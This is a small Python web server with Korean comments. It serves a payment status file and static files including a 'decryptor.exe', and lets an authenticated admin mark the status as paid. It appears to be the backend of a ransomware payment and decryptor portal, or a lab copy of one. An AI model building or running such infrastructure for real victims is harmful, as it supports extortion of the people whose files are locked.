from http.server import SimpleHTTPRequestHandler, HTTPServer
import json, os

ADMIN_USER = os.getenv("ADMIN_USER")
ADMIN_PASS = os.getenv("ADMIN_PASS")

class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/payment_status.json":
            # GET 상태 조회
            with open("payment_status.json", "r") as f:
                data = json.load(f)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(data).encode())
        else:
            # 나머지는 정적 파일 서빙 (index.html, style.css, decryptor.exe 등)
            super().do_GET()

    def do_PUT(self):
        if self.path == "/payment_status.json":
            # Basic Auth 체크
            auth = self.headers.get('Authorization', '')
            if not auth.startswith("Basic "):
                self.send_response(401)
                self.send_header("WWW-Authenticate", 'Basic realm="Admin API"')
                self.end_headers()
                return
            creds = auth.split(' ',1)[1]
            user, pwd = json.loads(json.dumps(creds)).encode('utf-8'), None  # dummy to fill
            import base64
            decoded = base64.b64decode(creds).decode()
            user, pwd = decoded.split(':',1)
            if user != ADMIN_USER or pwd != ADMIN_PASS:
                self.send_response(401)
                self.send_header("WWW-Authenticate", 'Basic realm="Admin API"')
                self.end_headers()
                return

            # isPaid=true 로 업데이트
            with open("payment_status.json", "w") as f:
                json.dump({"isPaid": True}, f, indent=2)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"message":"Payment status updated"}')
        else:
            self.send_response(405)
            self.end_headers()

if __name__ == "__main__":
    port = 8000
    print(f"Starting server at http://localhost:{port}")
    HTTPServer(("", port), Handler).serve_forever()
